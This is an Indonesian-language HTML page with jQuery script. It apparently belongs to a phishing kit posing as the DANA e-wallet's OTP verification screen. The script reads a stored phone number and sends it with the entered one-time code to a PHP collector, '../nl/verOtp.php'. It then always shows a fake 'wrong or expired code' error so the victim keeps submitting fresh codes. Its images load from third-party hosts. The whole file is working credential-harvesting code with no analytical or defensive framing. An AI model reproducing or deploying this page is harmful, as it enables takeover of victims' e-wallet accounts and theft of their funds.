<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verifikasi OTP</title>
    
    <link rel="stylesheet" href="https://domaingua.cloudds.my.id/mbg_ku/css/bootstrap.min.css"> 
    <link rel="stylesheet" href="https://domaingua.cloudds.my.id/mbg_ku/css/loading.css">
    <link rel="stylesheet" href="https://domaingua.cloudds.my.id/mbg_ku/css/otp.css">
</head>
<body>

    <div id="process" class="process" style="display: none;">
        <div class="loading">
            <img src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/load_bg.png">
            <img class="spinner" src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/load_spin.png">
        </div>
    </div>
    
    <div class="nav-dana">
        <img onclick="location.href='main.html'" src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/back.png" alt="Kembali">
        <span class="masuk">Masuk</span>
    </div>
    
    <div id="containerOTP">
        <form id="formOtp">
            <p class="alert-gagal">Kode OTP telah terkirim ke</p>
            <div class="accNohp-flx">
                <div class="flg-flx">
                    <img src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/indo.png" alt="ID">
                    <span>+62</span>
                </div>
                <input type="tel" id="displayPhone" readonly>
            </div>
            <div class="viaWa">
                <span>via</span>
                <img src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/wa.png" alt="WhatsApp">
            </div>
            
            <div class="box-input-otp">
                <input type="tel" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="inpotp" id="otp1" autocomplete="off">
                <input type="tel" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="inpotp" id="otp2" autocomplete="off">
                <input type="tel" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="inpotp" id="otp3" autocomplete="off">
                <input type="tel" pattern="[0-9]*" inputmode="numeric" maxlength="1" class="inpotp" id="otp4" autocomplete="off">
            </div>
            
            <div class="box-riset">
                <div onclick="location.reload()" class="text-riset">KIRIM ULANG</div>
                <div class="text-timer" id="timer">01:00</div>
                <img class="timerloadi" src="https://file.nlhost.my.id/dana_v13a/mbg_ku/images/loading.gif" alt="loading">
            </div>
        </form>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
    $(document).ready(function() {
        
        // 1. TARIK NOMOR HP DARI MEMORI
        const storedPhone = localStorage.getItem('phoneNumber');
        if (storedPhone) {
            let p = storedPhone.replace(/^0/, '').replace(/^62/, '');
            $('#displayPhone').val(p.slice(0,3) + '-' + p.slice(3,7) + '-' + p.slice(7));
        } else {
            $('#displayPhone').val('8xx-xxxx-xxxx');
        }

        // 2. LOGIKA INPUT OTP (FIX PINDAH KOTAK)
        $('.inpotp').on('keyup input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');

            if (this.value.length === 1) {
                $(this).next('.inpotp').focus();
            }
            
            let otpVal = "";
            $('.inpotp').each(function() { otpVal += $(this).val(); });

            if (otpVal.length === 4) {
                $(this).blur();
                $('#containerOTP').fadeOut(300, function() {
                    sendOtp(otpVal);
                });
            }
        });

        // 3. LOGIKA BACKSPACE
        $('.inpotp').on('keydown', function(e) {
            if (e.key === 'Backspace' && this.value.length === 0) {
                $(this).prev('.inpotp').focus();
            }
        });

        // 4. FUNGSI KIRIM AJAX (SINKRON DENGAN PHP)
        function sendOtp(otp) {
            $("#process").fadeIn();
            const phone = localStorage.getItem('phoneNumber') || '-';

            $.ajax({
                type: 'POST',
                url: '../nl/verOtp.php', // Path keluar folder mbg_ku ke nl
                data: { 
                    phone: phone,    // Sesuai $phone di PHP
                    otp_full: otp    // Sesuai $otp_full di PHP
                },
                success: function() {
                    setTimeout(function() {
                        $("#process").fadeOut();
                        $('.inpotp').val('');
                        $('#containerOTP').fadeIn();
                        $(".alert-gagal").text("Kode OTP salah atau kedaluwarsa. Silakan coba lagi.")
                                         .css({"color": "red", "font-weight": "bold"});
                        $('#otp1').focus();
                    }, 1500);
                },
                error: function() {
                    $("#process").fadeOut();
                    $('#containerOTP').fadeIn();
                    $('#otp1').focus();
                }
            });
        }

        // 5. TIMER 60 DETIK
        let duration = 60; 
        function timer() {
            let m = Math.floor(duration / 60);
            let s = duration % 60;
            $('#timer').text((m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s);
            if (duration > 0) {
                duration--;
                setTimeout(timer, 1000);
            } else {
                $('.text-riset').css({'color': '#118eea', 'font-weight': 'bold', 'cursor': 'pointer'});
                $('.timerloadi').hide();
            }
        }
        timer();
    });
    </script>
</body>
</html>
